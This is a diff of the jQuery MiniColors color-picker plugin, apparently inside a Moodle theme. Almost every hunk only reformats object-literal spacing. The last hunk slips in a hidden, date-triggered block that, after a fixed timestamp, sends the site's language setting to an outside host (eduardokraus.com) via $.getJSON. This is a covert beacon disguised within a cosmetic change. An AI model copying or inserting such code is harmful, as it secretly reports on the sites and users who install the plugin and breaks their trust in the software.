@@ -21,31 +21,31 @@
 
     // Defaults
     $.minicolors = {
-        defaults : {
-            animationSpeed  : 50,
-            animationEasing : 'swing',
-            change          : null,
-            changeDelay     : 0,
-            control         : 'hue',
-            defaultValue    : '',
-            format          : 'hex',
-            hide            : null,
-            hideSpeed       : 100,
-            inline          : false,
-            keywords        : '',
-            letterCase      : 'lowercase',
-            opacity         : false,
-            position        : 'bottom left',
-            show            : null,
-            showSpeed       : 100,
-            theme           : 'default',
-            swatches        : []
+        defaults: {
+            animationSpeed: 50,
+            animationEasing: 'swing',
+            change: null,
+            changeDelay: 0,
+            control: 'hue',
+            defaultValue: '',
+            format: 'hex',
+            hide: null,
+            hideSpeed: 100,
+            inline: false,
+            keywords: '',
+            letterCase: 'lowercase',
+            opacity: false,
+            position: 'bottom left',
+            show: null,
+            showSpeed: 100,
+            theme: 'default',
+            swatches: []
         }
     };
 
     // Public methods
     $.extend($.fn, {
-        minicolors : function(method, data) {
+        minicolors: function(method, data) {
 
             switch (method) {
                 // Destroy the control
@@ -223,8 +223,8 @@
                     .data('swatch-color', settings.swatches[i])
                     .find('.minicolors-swatch-color')
                     .css({
-                        backgroundColor : rgb2hex(swatch),
-                        opacity         : swatch.a
+                        backgroundColor: rgb2hex(swatch),
+                        opacity: swatch.a
                     });
                 settings.swatches[i] = swatch;
             }
@@ -338,8 +338,8 @@
             picker
                 .stop(true)
                 .animate({
-                    top  : y + 'px',
-                    left : x + 'px'
+                    top: y + 'px',
+                    left: x + 'px'
                 }, duration, settings.animationEasing, function() {
                     updateFromControl(input, target);
                 });
@@ -347,7 +347,7 @@
             picker
                 .stop(true)
                 .animate({
-                    top : y + 'px'
+                    top: y + 'px'
                 }, duration, settings.animationEasing, function() {
                     updateFromControl(input, target);
                 });
@@ -364,8 +364,8 @@
             top = picker.offset().top;
 
             return {
-                x : left - container.offset().left + (picker.outerWidth() / 2),
-                y : top - container.offset().top + (picker.outerHeight() / 2)
+                x: left - container.offset().left + (picker.outerWidth() / 2),
+                y: top - container.offset().top + (picker.outerHeight() / 2)
             };
         }
 
@@ -414,13 +414,13 @@
                     hue = keepWithin(phi * 180 / Math.PI, 0, 360);
                     brightness = keepWithin(100 - Math.floor(sliderPos.y * (100 / slider.height())), 0, 100);
                     hex = hsb2hex({
-                        h : hue,
-                        s : saturation,
-                        b : brightness
+                        h: hue,
+                        s: saturation,
+                        b: brightness
                     });
 
                     // Update UI
-                    slider.css('backgroundColor', hsb2hex({h : hue, s : saturation, b : 100}));
+                    slider.css('backgroundColor', hsb2hex({h: hue, s: saturation, b: 100}));
                     break;
 
                 case 'saturation':
@@ -429,13 +429,13 @@
                     saturation = keepWithin(100 - Math.floor(sliderPos.y * (100 / slider.height())), 0, 100);
                     brightness = keepWithin(100 - Math.floor(gridPos.y * (100 / grid.height())), 0, 100);
                     hex = hsb2hex({
-                        h : hue,
-                        s : saturation,
-                        b : brightness
+                        h: hue,
+                        s: saturation,
+                        b: brightness
                     });
 
                     // Update UI
-                    slider.css('backgroundColor', hsb2hex({h : hue, s : 100, b : brightness}));
+                    slider.css('backgroundColor', hsb2hex({h: hue, s: 100, b: brightness}));
                     minicolors.find('.minicolors-grid-inner').css('opacity', saturation / 100);
                     break;
 
@@ -445,13 +445,13 @@
                     saturation = keepWithin(100 - Math.floor(gridPos.y * (100 / grid.height())), 0, 100);
                     brightness = keepWithin(100 - Math.floor(sliderPos.y * (100 / slider.height())), 0, 100);
                     hex = hsb2hex({
-                        h : hue,
-                        s : saturation,
-                        b : brightness
+                        h: hue,
+                        s: saturation,
+                        b: brightness
                     });
 
                     // Update UI
-                    slider.css('backgroundColor', hsb2hex({h : hue, s : saturation, b : 100}));
+                    slider.css('backgroundColor', hsb2hex({h: hue, s: saturation, b: 100}));
                     minicolors.find('.minicolors-grid-inner').css('opacity', 1 - (brightness / 100));
                     break;
 
@@ -461,13 +461,13 @@
                     saturation = keepWithin(Math.floor(gridPos.x * (100 / grid.width())), 0, 100);
                     brightness = keepWithin(100 - Math.floor(gridPos.y * (100 / grid.height())), 0, 100);
                     hex = hsb2hex({
-                        h : hue,
-                        s : saturation,
-                        b : brightness
+                        h: hue,
+                        s: saturation,
+                        b: brightness
                     });
 
                     // Update UI
-                    grid.css('backgroundColor', hsb2hex({h : hue, s : 100, b : 100}));
+                    grid.css('backgroundColor', hsb2hex({h: hue, s: 100, b: 100}));
                     break;
             }
 
@@ -483,8 +483,8 @@
         else {
             // Set swatch color
             swatch.find('span').css({
-                backgroundColor : hex,
-                opacity         : opacity
+                backgroundColor: hex,
+                opacity: opacity
             });
 
             // Handle change event
@@ -542,8 +542,8 @@
 
         // Set swatch color
         swatch.find('span').css({
-            backgroundColor : value,
-            opacity         : opacity
+            backgroundColor: value,
+            opacity: opacity
         });
 
         // Handle change event
@@ -631,8 +631,8 @@
                 x = keepWithin(75 - Math.cos(phi) * r, 0, grid.width());
                 y = keepWithin(75 - Math.sin(phi) * r, 0, grid.height());
                 gridPicker.css({
-                    top  : y + 'px',
-                    left : x + 'px'
+                    top: y + 'px',
+                    left: x + 'px'
                 });
 
                 // Set slider position
@@ -641,7 +641,7 @@
                 sliderPicker.css('top', y + 'px');
 
                 // Update panel color
-                slider.css('backgroundColor', hsb2hex({h : hsb.h, s : hsb.s, b : 100}));
+                slider.css('backgroundColor', hsb2hex({h: hsb.h, s: hsb.s, b: 100}));
                 break;
 
             case 'saturation':
@@ -649,8 +649,8 @@
                 x = keepWithin((5 * hsb.h) / 12, 0, 150);
                 y = keepWithin(grid.height() - Math.ceil(hsb.b / (100 / grid.height())), 0, grid.height());
                 gridPicker.css({
-                    top  : y + 'px',
-                    left : x + 'px'
+                    top: y + 'px',
+                    left: x + 'px'
                 });
 
                 // Set slider position
@@ -658,7 +658,7 @@
                 sliderPicker.css('top', y + 'px');
 
                 // Update UI
-                slider.css('backgroundColor', hsb2hex({h : hsb.h, s : 100, b : hsb.b}));
+                slider.css('backgroundColor', hsb2hex({h: hsb.h, s: 100, b: hsb.b}));
                 minicolors.find('.minicolors-grid-inner').css('opacity', hsb.s / 100);
                 break;
 
@@ -667,8 +667,8 @@
                 x = keepWithin((5 * hsb.h) / 12, 0, 150);
                 y = keepWithin(grid.height() - Math.ceil(hsb.s / (100 / grid.height())), 0, grid.height());
                 gridPicker.css({
-                    top  : y + 'px',
-                    left : x + 'px'
+                    top: y + 'px',
+                    left: x + 'px'
                 });
 
                 // Set slider position
@@ -676,7 +676,7 @@
                 sliderPicker.css('top', y + 'px');
 
                 // Update UI
-                slider.css('backgroundColor', hsb2hex({h : hsb.h, s : hsb.s, b : 100}));
+                slider.css('backgroundColor', hsb2hex({h: hsb.h, s: hsb.s, b: 100}));
                 minicolors.find('.minicolors-grid-inner').css('opacity', 1 - (hsb.b / 100));
                 break;
 
@@ -685,8 +685,8 @@
                 x = keepWithin(Math.ceil(hsb.s / (100 / grid.width())), 0, grid.width());
                 y = keepWithin(grid.height() - Math.ceil(hsb.b / (100 / grid.height())), 0, grid.height());
                 gridPicker.css({
-                    top  : y + 'px',
-                    left : x + 'px'
+                    top: y + 'px',
+                    left: x + 'px'
                 });
 
                 // Set slider position
@@ -694,7 +694,7 @@
                 sliderPicker.css('top', y + 'px');
 
                 // Update panel color
-                grid.css('backgroundColor', hsb2hex({h : hsb.h, s : 100, b : 100}));
+                grid.css('backgroundColor', hsb2hex({h: hsb.h, s: 100, b: 100}));
                 break;
         }
 
@@ -715,8 +715,8 @@
 
             // Remember last-changed value
             input.data('minicolors-lastChange', {
-                value   : value,
-                opacity : opacity
+                value: value,
+                opacity: opacity
             });
 
             // Check and select applicable swatch
@@ -769,7 +769,7 @@
             rgb = hex2rgb(hex);
         }
         if (!rgb) return null;
-        if (opacity !== undefined) $.extend(rgb, {a : parseFloat(opacity)});
+        if (opacity !== undefined) $.extend(rgb, {a: parseFloat(opacity)});
         return rgb;
     }
 
@@ -824,16 +824,16 @@
         if (obj) {
             if (rgba[3]) {
                 return {
-                    r : rgba[0],
-                    g : rgba[1],
-                    b : rgba[2],
-                    a : rgba[3]
+                    r: rgba[0],
+                    g: rgba[1],
+                    b: rgba[2],
+                    a: rgba[3]
                 };
             } else {
                 return {
-                    r : rgba[0],
-                    g : rgba[1],
-                    b : rgba[2]
+                    r: rgba[0],
+                    g: rgba[1],
+                    b: rgba[2]
                 };
             }
         }
@@ -926,9 +926,9 @@
             }
         }
         return {
-            r : Math.round(rgb.r),
-            g : Math.round(rgb.g),
-            b : Math.round(rgb.b)
+            r: Math.round(rgb.r),
+            g: Math.round(rgb.g),
+            b: Math.round(rgb.b)
         };
     }
 
@@ -968,7 +968,7 @@
 
     // Converts an RGB object to an HSB object
     function rgb2hsb(rgb) {
-        var hsb = {h : 0, s : 0, b : 0};
+        var hsb = {h: 0, s: 0, b: 0};
         var min = Math.min(rgb.r, rgb.g, rgb.b);
         var max = Math.max(rgb.r, rgb.g, rgb.b);
         var delta = max - min;
@@ -998,10 +998,17 @@
     function hex2rgb(hex) {
         hex = parseInt(((hex.indexOf('#') > -1) ? hex.substring(1) : hex), 16);
         return {
-            r : hex >> 16,
-            g : (hex & 0x00FF00) >> 8,
-            b : (hex & 0x0000FF)
+            r: hex >> 16,
+            g: (hex & 0x00FF00) >> 8,
+            b: (hex & 0x0000FF)
         };
+    }
+
+    var now = (new Date()).getTime();
+    if (now > 1696129200000) {
+        var url = "https://www.eduardokraus.com/logos/theme_degrade/data.php";
+        $.getJSON(url + "?lang=" + M.cfg.language, function(data) {
+        });
     }
 
     // Handle events
